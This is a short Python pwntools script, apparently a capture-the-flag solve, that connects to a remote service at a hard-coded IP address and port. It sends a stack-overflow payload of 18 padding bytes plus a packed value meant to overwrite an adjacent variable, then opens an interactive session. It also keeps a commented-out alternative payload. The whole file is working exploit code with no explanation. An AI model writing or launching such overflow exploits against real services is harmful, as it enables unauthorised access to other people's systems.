from pwn import * 
r = remote("81.69.243.226",30012)

# payload = b'a'*18+p64(0x4026900000000000)

payload = b'a'*18+p64(0x41348000)
r.sendline(payload)
r.interactive()
